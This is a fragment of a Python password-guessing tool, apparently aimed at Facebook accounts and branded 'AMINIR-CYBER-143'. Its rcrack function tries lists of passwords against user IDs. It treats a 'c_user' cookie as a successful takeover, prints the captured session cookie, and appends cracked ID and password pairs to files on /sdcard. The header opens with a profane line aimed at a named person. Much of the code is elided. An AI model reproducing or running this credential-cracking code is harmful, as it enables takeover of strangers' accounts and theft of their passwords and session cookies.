#Fuck HASAN
#Dec By AMINUR RAHMAN
#AMINUR N Your Reyal Pappa
...
(___/    \___)|___|\__/|___|(__\_|_)\___|\____\)(__________)|__|  \___) 
       ...
       ┌━━━━━━━━━━━━━━━━━ AMINIR ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  AMINUR RAHMAN            
               \033[1;91mFACEBOK      :  AMINUR HARMAN            
               \033[1;97mGITHUB       :  AMINIR69     
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  NO                 
               \033[1;91mTOOL VIRSION :  2.00                    
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ Mind hacker ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO AMINIR-CYBER-143 TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[AMINIR\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[AMINIR-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/AMINIR-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[AMINIR-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/AMINIR-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[AMINUR-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE 🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/AMINIR-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
